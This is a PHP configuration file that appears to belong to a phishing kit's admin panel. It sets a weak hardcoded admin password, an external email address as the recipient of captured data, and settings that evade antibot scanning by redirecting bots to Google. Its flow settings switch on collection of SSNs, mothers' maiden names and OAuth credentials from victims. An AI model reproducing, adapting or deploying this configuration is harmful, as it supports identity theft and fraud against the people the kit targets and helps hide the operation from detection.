<?php
// Admin configuration
return array (
  'admin_user' => 'admin',
  'admin_pass' => 'admin123',
  'email_recipient' => 'wrix404@yandex.com',
  'session_timeout' => 3600,
  'access_parameter' => 'access',
  'admin_access_parameter' => 'phoniex',
  'proxy_detection_enabled' => false,
  'botProtection' => false,
  'gobotDomain' => "http://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]",
  'botGobotApiKey' => "855c94471b336cff44a04d5165f3fb8b",
  'botRedirection' => "https://href.li/?https://www.google.com",
  'cloudflare_checkbox_enabled' => false,
  'flow_settings' => 
  array (
    'security_mmn_enabled' => true,
    'security_ssn_enabled' => true,
    'oauth_enabled' => true,
  ),
);